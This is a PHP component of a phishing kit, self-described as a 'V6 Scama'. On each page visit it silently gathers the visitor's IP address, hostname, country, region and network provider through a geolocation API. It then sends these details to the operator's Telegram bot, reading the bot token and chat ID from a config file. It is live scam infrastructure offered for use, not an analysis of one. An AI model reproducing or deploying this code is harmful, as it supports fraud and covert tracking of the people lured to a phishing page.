<?php

error_reporting(0);
$tanitatikaram = parse_ini_file("./config.ini", true);
$viewsToken = $tanitatikaram['viewsToken'];
$viewsChatID = $tanitatikaram['viewsChatID'];
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$url = "http://ip-api.com/json/" . $ip;
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$resp = curl_exec($ch);
curl_close($ch);
$details = json_decode($resp, true);
$countryname = $details['country'];
$Region = $details['regionName'];
$asn = $details['as'];
$body .= "Your V6 Scama Getting Visit @mac_Hemsworth\n";
$body .= "IP Address: {$ip}" . "\n";
$body .= "country: {$countryname}" . "\n";
$body .= "Region: {$Region}" . "\n";
$body .= "Asn: {$asn}" . "\n";
$body .= "TIME: " . date("d/m/Y h:i:sa") . " GMT" . "\n";
$body .= "HOSTNAME : {$hostname}" . "\n";
function callAPI($url)
{
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
    $result = curl_exec($curl);
    curl_close($curl);
}
$result = urlencode($body);

callAPI('https://api.telegram.org/bot' . $viewsToken . '/sendMessage?chat_id=' . $viewsChatID . '&text=' . $result . "&parse_mode=html");
